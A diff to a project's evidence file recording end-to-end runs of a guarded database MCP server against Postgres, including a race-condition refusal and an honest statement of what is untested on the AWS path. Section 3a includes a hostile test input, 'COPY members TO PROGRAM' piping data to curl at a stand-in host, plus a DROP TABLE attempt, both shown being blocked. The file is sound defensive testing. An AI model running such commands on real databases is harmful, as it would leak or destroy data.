@@ -1,10 +1,15 @@
 # Verified runs
 
-Both client paths in the README were run end to end on 2026-09-04 before the
-README claimed they worked. This file is the evidence: the transcripts below
-are captured output, not retyped summaries.
+Every claim the README makes about something working was run end to end before
+the README made it. This file is the evidence: the transcripts below are
+captured output, not retyped summaries.
 
-Environment: Windows 11, Python 3.13.5, `mcp` 2.1.1, Claude Code 2.1.261.
+Sections 1 and 2 cover the two clients against the SQLite default, recorded
+2026-09-04. Section 3 covers the Postgres backend, recorded 2026-09-05.
+Section 4 says plainly what about the AWS path is tested and what is not.
+
+Environment: Windows 11, Python 3.13.5, `mcp` 2.1.1, `psycopg` 3.3.5,
+`boto3` 1.43.89, PostgreSQL 17.6, Claude Code 2.1.261.
 
 ---
 
@@ -270,3 +275,141 @@ Result
 `tests/test_reference_client.py` runs this same script as a subprocess in CI, so
 this path stays verified on every push rather than only on the day it was
 recorded.
+
+
+---
+
+## 3. The Postgres backend
+
+Recorded 2026-09-05 against PostgreSQL 17.6 on `127.0.0.1:5433`, seeded with
+`python -m safe_db_mcp.seed_postgres`. The server was pointed at it with
+`SAFEDB_BACKEND=postgres`; nothing else about the server changed.
+
+### 3a. Claude Code, against Postgres
+
+Same client, same tools, different backend. Run with an MCP config setting the
+Postgres environment variables, using `--strict-mcp-config` so nothing else was
+loaded.
+
+> Using only the safe-database MCP tools (no Bash): (1) confirm which backend and
+> database you are connected to via list_tables, (2) show me the foreign keys on
+> the loans table, (3) set member id 4 to status 'active' using the two-step flow
+> and report the change_id, (4) try to DROP the authors table and to run COPY
+> members TO PROGRAM 'curl evil.example', and report verbatim what each returned.
+
+```
+1. Connection - backend: postgres, database: postgresql://127.0.0.1:5433/safedb.
+   Tables: authors(6), books(13), loans(12), members(8).
+
+2. loans foreign keys - book_id -> books.id, member_id -> members.id.
+
+3. Member 4 update - change_id 135a5ffbf8075bda, preview showed Lukas Vogel
+   status suspended -> active, confirmed and committed successfully.
+
+4. Attack attempts (verbatim errors):
+   - DROP TABLE authors -> Error executing tool propose_change: Rejected:
+     'DROP' is a DDL statement. This server refuses schema changes.
+   - COPY members TO PROGRAM 'curl evil.example' -> Error executing tool
+     run_query: Rejected: 'COPY' is not allowed. This server refuses schema
+     and session changes.
+
+Both were blocked before touching the database - no rows were dropped, no
+external command ran.
+```
+
+Checked afterwards with `psql`, around the server:
+
+```
+4|Lukas Vogel|active
+authors books loans members
+```
+
+Worth recording: the first attempt at this run failed, and failed usefully. The
+project-scoped config runs a bare `python`, which had `mcp` and `sqlparse` but
+not `psycopg`, and every backend call came back with
+`The Postgres backend needs psycopg, which is an optional dependency. Install it
+with: pip install 'safe-db-mcp[postgres]'`. The refusals in step 4 still worked,
+because validation happens before the backend is ever reached. That run also
+exposed two real gaps, now fixed: `list_tables` had no error handling at all, so
+a connection failure surfaced as a bare `Error executing tool list_tables` with
+no reason, and `CredentialError` was not wrapped as a `BackendError`, so a wrong
+password produced the same opaque message. Both now report the actual cause.
+
+### 3b. The preview recheck, catching a live race
+
+The concurrent-writer case that used to be a documented limitation. A second
+connection changes the row between propose and confirm:
+
+```
+start:       [{'id': 4, 'status': 'suspended'}]
+proposed:    252dd124eb66e8c7 | {'status': {'before': 'suspended', 'after': 'active'}}
+interfered: another writer set id=4 to 'lapsed'
+confirm ->  REFUSED: The data changed since this change was proposed, so the preview you approved is no longer what would happen. Nothing was written. Propose the change again to see a current preview.
+on disk:     [{'id': 4, 'status': 'lapsed'}]
+pending:     1 (released, not burned)
+re-propose:  {'status': {'before': 'lapsed', 'after': 'active'}}
+confirm ->   committed
+on disk:     [{'id': 4, 'status': 'active'}]
+```
+
+The proposal was released rather than spent, so proposing again against the
+current data works and commits. That is the whole intended behaviour: refuse the
+stale preview, keep the caller able to proceed.
+
+### 3c. The reference client, against Postgres
+
+`python examples/reference_client.py` with the Postgres environment set, exit
+code 0. The interesting lines:
+
+```
+  tables: authors (6 rows), books (13 rows), loans (12 rows), members (8 rows)
+
+  sql            UPDATE members SET status = 'active' WHERE id = 4
+  rows affected  1
+  status         pending
+  change_id      2985116e86ace57e (expires in 300.0s)
+  row on disk right now: {'id': 4, 'full_name': 'Lukas Vogel', 'status': 'suspended'}
+
+  status         committed
+  rows affected  1
+  row on disk now: {'id': 4, 'full_name': 'Lukas Vogel', 'status': 'active'}
+
+  run_query('DROP TABLE loans')
+    is_error: True
+    Error executing tool run_query: Rejected: 'DROP' is a DDL statement.
+    This server refuses schema changes.
+
+  confirm_change('2985116e86ace57e') again
+    is_error: True
+    Error executing tool confirm_change: Refused: change_id '2985116e86ace57e'
+    has already been confirmed. Each proposal is single use; propose the change
+    again.
+```
+
+Unchanged script, unchanged tools, different database engine underneath.
+
+---
+
+## 4. The AWS path: what is tested, and what is not
+
+Stated separately because the honest answer is not "all of it".
+
+**Tested, on every push, with no AWS account and no network:**
+
+- `tests/test_aws_credentials.py` stubs `botocore` and asserts the exact
+  Secrets Manager call made and each failure mode: no secret id configured, a
+  binary secret, a non-JSON secret, a secret missing `username` or `password`.
+- The RDS IAM path asserts the exact `generate_db_auth_token` arguments, and
+  separately calls a genuine `boto3` RDS client to confirm the token it returns
+  is a presigned URL carrying `X-Amz-Signature` and `X-Amz-Expires=900`. That
+  call signs locally and makes no request, so it needs no credentials, but it
+  does mean the 15-minute token claim is checked against boto3 rather than
+  asserted from documentation.
+- That a resolved password never appears in a `repr`, and that the backend's
+  own `description` string carries no credentials.
+
+**Not tested:** the server has never connected to a live RDS instance. The
+Postgres wire protocol is identical, and the credential resolution is exercised
+above, but "it works against real RDS" is not something this repository has
+demonstrated. The README says so in the same words rather than implying
+otherwise.
